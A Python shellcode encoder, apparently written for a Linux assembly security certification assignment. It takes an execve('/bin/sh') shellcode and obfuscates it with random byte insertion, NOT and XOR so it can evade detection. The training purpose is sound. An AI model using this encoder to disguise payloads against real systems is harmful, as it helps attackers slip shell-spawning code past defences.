#!/usr/bin/python3
'''
Filename:   encoder.py
Author:     aus-mate
Purpose:    This code was written for assignment #4 of the SecurityTube Linux Assembly Expert certification.
Student ID: SLAE-1555
'''
import os

shellcode = bytearray("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", 'ISO-8859-1')
ins_encoded = bytearray("", 'ISO-8859-1')
not_encoded = bytearray("", 'ISO-8859-1')
enc_shellcode = bytearray("", 'ISO-8859-1')

print("Original: " + "\"" + "".join("\\x%02x" % i for i in shellcode) + "\"")

for i in shellcode:
    ins_encoded.append(i)
    while(1):
        rand_bytes = os.urandom(2)
        if ((not b'\x00' in rand_bytes) and (not b'\x55' in rand_bytes)):
            break
    ins_encoded += rand_bytes

for i in ins_encoded:
    x = ~i
    not_encoded += bytes.fromhex('%02x' % (x & 0xff))

for i in not_encoded:
    x = i^0xAA
    enc_shellcode += bytes.fromhex('%02x' % (x & 0xff))

enc_shellcode += b'\xaa'

# print("\nEncoded: " + "\"" + "".join("\\x%02x" % i for i in enc_shellcode) + "\"")
print("\nEncoded: " + "".join("0x%02x," % i for i in enc_shellcode))

